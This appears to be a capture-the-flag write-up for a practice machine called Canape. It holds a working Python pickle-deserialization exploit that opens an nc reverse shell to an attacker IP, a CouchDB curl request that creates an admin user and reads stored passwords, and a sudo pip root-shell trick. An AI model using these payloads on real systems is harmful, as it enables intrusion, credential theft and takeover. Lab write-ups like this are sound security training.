# Canape

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.107.118          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 17:06 +08
Nmap scan report for 10.129.107.118
Host is up (0.011s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
65535/tcp open  unknown
```

Did a detailed scan as well:

```
$ nmap -p 80,65535 -sC -sV --min-rate 4000 10.129.107.118                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 17:07 +08
Nmap scan report for 10.129.107.118
Host is up (0.0073s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.129.107.118:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Simpsons Fan Site
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d820b3190e4c885b2538ba17c3b65e1 (RSA)
|   256 22fc6ec35500850f24bff5796c928b68 (ECDSA)
|_  256 0d912751805e2ba3810de9d85c9b7735 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There's a `.git` repository present on the website. There is also a domain we have to add to our `/etc/hosts` file.&#x20;

### Web + Git Enumeration

The website was a Flask based website:

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

We can submit quotes to be viewed on the website through the using specific Simpsons characters:

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Since we have a `.git` repository, we can dump that out first.&#x20;

{% embed url="https://github.com/arthaud/git-dumper" %}

```
$ python3 git_dumper.py http://canape.htb .git
$ git checkout -- .
```

Then, we can view the files present.&#x20;

### cPickle RCE

There was an `__init__.py` file that contained the source code for the website. There were a few interesting routes:

```python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item
```

Pickling is used here, and it might be exploitable later. If `p1` is in `data`, then it passes it to the `cPickle.loads()` function. The `cPickle` function used actually allows for RCE.&#x20;

Based on online scripts, we have to create a Python class using the `__reduce__` with our command, and then pickle the content using the `cPickle` library. Afterwards, we need to send a POST request to `/check` with the `id` parameter set to the MD5 hash of our character and payload combined.

To bypass the character check, we just need to include a Simpsons character as a substring of the actual thing. &#x20;

The website code uses `python2`, so I also used `python2` to match:

```python
import cPickle
import os
import requests
from hashlib import md5

class PickleRce(object):
    def __reduce__(self):
        return (os.system,('homer*; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f',))

character, quote = cPickle.dumps(PickleRce()).split('*')
print(cPickle.dumps(PickleRce()))
checksum = md5(character + quote).hexdigest()

requests.post('http://canape.htb/submit', data = {'character':character,'quote':quote})
requests.post('http://canape.htb/check', data={'id':checksum})
```

Running it gives me this string:

```
$ python2 rce.py
cposix
system
p1
(S'homer*; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'
p2
tp3
Rp4
.
```

The reason we split the string by `*` is because of the weird string it generates. Running this gives us a shell:

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We cannot read the user's flag yet.&#x20;

### CouchDB --> User Creds

The user was called `homer`, and they were running some processes:

{% code overflow="wrap" %}
```
www-data@canape:/$ ps -elf | grep homer
4 S homer       610    606  0  80   0 - 162335 -     02:03 ?        00:01:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```
{% endcode %}

CouchDB was being run on the machine, and it is running a vulnerable version.&#x20;

{% embed url="https://www.exploit-db.com/exploits/44913" %}

However, this exploit does not seem to work on the machine. Since this is a DB and can interact with it, perhaps it has passwords within it. The references within the exploit have a link to this:

{% embed url="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" %}

The above uses `curl` to create a new administrator user on the machine.&#x20;

{% code overflow="wrap" %}
```bash
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{"type": "user", "name": "oops", "roles": ["_admin"], "roles": [], "password": "password"}'
```
{% endcode %}

Afterwards, we can read the passwords:

```
www-data@canape:/$ curl 127.0.0.1:5984/passwords/_all_docs --user 'oops:password'
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

The one on the last row contains a hint about the user's password:

{% code overflow="wrap" %}
```
www-data@canape:/$ curl 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 --user 'oops:password'
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```
{% endcode %}

With this, we can `ssh` in as `homer` using the password from the other fields:

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Sudo Pip --> Root

When checking `sudo` privileges, we see that we can run `pip install` as `root`:

```
homer@canape:~$ sudo -l
[sudo] password for homer: 
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

Using this, we can spawn a `root` shell using the PoC on GTFOBins:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Rooted!
